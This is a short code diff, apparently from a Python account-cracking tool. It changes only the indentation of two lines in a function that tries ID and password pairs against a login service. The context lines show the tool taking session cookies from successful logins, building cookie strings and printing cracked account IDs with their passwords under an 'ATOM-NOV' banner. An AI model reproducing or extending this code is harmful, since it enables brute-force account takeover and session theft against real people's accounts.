@@ -1879,8 +1879,8 @@ def m7(ids,pwv):
                         oks.append(cid)
                         return True
                 if 'die' in res:
-			print(f'\r\r{rad}[{green}ATOM-NOV{rad}]{WHITE} {cid} {rad}▶︎ {WHITE}{pas}')
-			return True
+                        print(f'\r\r{rad}[{green}ATOM-NOV{rad}]{WHITE} {cid} {rad}▶︎ {WHITE}{pas}')
+                        return True
               elif 'session_key' in json_response:
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                 cid = str(q['uid'])
@@ -1896,8 +1896,8 @@ def m7(ids,pwv):
                         oks.append(cid)
                         return True
                 if 'die' in res:
-			print(f'\r\r{rad}[{green}ATOM-NOV{rad}]{WHITE} {cid} {rad}▶︎ {WHITE}{pas}')
-			return True
+                        print(f'\r\r{rad}[{green}ATOM-NOV{rad}]{WHITE} {cid} {rad}▶︎ {WHITE}{pas}')
+                        return True
             else:
               print(f"[Failed] status-code {response.status_code} for {cid}")
               continue
